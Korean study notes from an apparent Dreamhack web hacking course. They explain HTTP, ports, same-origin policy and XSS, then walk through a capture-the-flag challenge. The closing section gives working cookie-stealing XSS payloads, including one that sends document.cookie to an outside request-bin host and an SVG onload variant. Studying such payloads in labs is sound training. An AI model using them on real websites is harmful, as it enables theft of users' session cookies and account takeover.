# Web Hakcing

## STAGE 2 



## HTTP



    HTTP : 서버와 클라이언트의 데이터 교환을 요청하고 응답하는 형식의 
    정의를 한 프로토콜 중 하나이다.

    *웹 서버는 HTTP 서버를 HTTP 서비스 포트에 대기시킨다.
    =이러한 포트는 일바전으로 TCP/80 or TCP/8080 이다.


## Network Port/Service Port

    네트워크 포트 : 네트워크에서 서버와 클라이언트가 정보를 교환하는 
    추상화된 장소를 의미한다.

    *0번 부터 65535번까지, 총 65536개의 같은 수의 네트워크 포트를 사용한다.


    서비스 포트 : 네트워크 포트 중에서 특정 서비스가 점유하고 있는 포트를 말함.
    Ex) HTTP가 80번 포트를 점유하고 있다면 서비스 포트는 80번 포트가 된다.


## Request
 
    /index.html
    
    HTTP/1.1
    Host: dreamhack.io
    Connection: keep-alive
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36

## Response

    HTTP/1.1  200 ok

    
    Server: Apache/2.4.29 (Ubuntu)
    Content-Length: 61
    Connection: Keep-Alive
    Content-Type: text/html

    <!doctype html>
    <html>
    <head>
    </head>
    <body>
    </body>
    </html>



### `Same Origin Policy의 오리진

    
    오리진 : 프로토콜, 포트, 호스트로 구성이 됨.
    * 모두 일치해야 동일한 오리진이라고 할 수 있음.


![오리진](https://cdn.discordapp.com/attachments/956190154454876183/1022424599792726056/unknown.png)



### `XSS`



    XSS : 클라이언트 사이드 취약점 중 하나로, 공격자가 웹 리소스에
    악성 스크립트를 삽입을 하여서 이용자의 웹 브라우저에서 해당
    스크립트를 실행할 수 있다.



## `XSS 발생 종류와 설명`


 ![XSS](https://media.discordapp.net/attachments/956190154454876183/1022464035733635092/unknown.png?width=477&height=408)



 ## `XSS 스크립트의 예시`


+ 쿠키 및 세션 탈취 공격 코드


![쿠키/세션 탈취 공격 코드](https://cdn.discordapp.com/attachments/956190154454876183/1022466126434795570/unknown.png)


+ 페이지 변조 공격 코드/ 위치 이동 공격 코드


![페이지 변조 공격/위치 이동 공격](https://cdn.discordapp.com/attachments/956190154454876183/1022466146139639828/unknown.png)



### `Stored XSS`


    Stored XSS : 서버의 데이터베이스 또는 파일 등의 형태로 저장된
    악성 스크립트를 조회할 때 발생하는 XSS이다.

    Ex) 게시물/댓글에 악성 스크립트를 포함하여 업로드 하는 방식임.


### `XSS-1`

    / : 인덱스 페이지
    /vuln : 이용자가 입력한 값을 출력을 하는 것
    /meno : 이용자가 메모를 남길 수 있으며, 작성한 메모를 출력
    /flag : 전달된 URL에 임의 이용자가 접속하게 함. 
      => 해당 이용자의 쿠키에는 FLAG가 존재함.


# 쿠키 탈취

## memo 페이지 사용

    flag 엔드포인트에서 다음과 같은 익스플로잇 코드를 입력하면
    memo 엔드포인트에서 임의 이용자의 쿠키 정보를 확인할 수 있음.

    <script>location.href = "/memo?memo="+document.cookie;</script>

## 웹 서버 사용

    외부에서 접근 가능한 웹 서버를 통해 탈취한 쿠키를 확인할 수 있음
    flag 기능에서 다음과 같은 익스플로잇 코드를 입력하면,
    접속 기록에 포함된 FLAG를 확인할 수 있다.

    <script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo="+document.cookie;</script>


`FALG page =>  <svg/onload=location="/memo?memo="+document.cookie;>`

    SVG 태그는 벡터 그래픽을 표현할 때 사용되는 데 이 태그를 이용하여 XSS 
    테스트가 가능하다.
















